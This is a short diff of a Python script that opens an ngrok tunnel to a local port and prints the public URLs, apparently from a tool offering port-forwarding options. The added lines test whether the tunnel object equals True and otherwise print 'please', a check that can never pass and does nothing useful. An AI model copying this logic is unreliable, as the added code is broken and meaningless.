@@ -551,6 +551,10 @@ exit();""")
              a = ngrok.connect(6060,"http",auth_token=token)
              print("\n"+Fore.RED+" [~] URL 1 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://").replace("-> https://localhost:6060",""))
              print("\n"+Fore.RED+" [~] URL 2 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> http://localhost:6060",""))
+             if a == True:
+                            pass
+             else:
+                    print ("please")
        except:
                 print(Fore.RED+" [~] Please Check your Internet Connection")
     v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
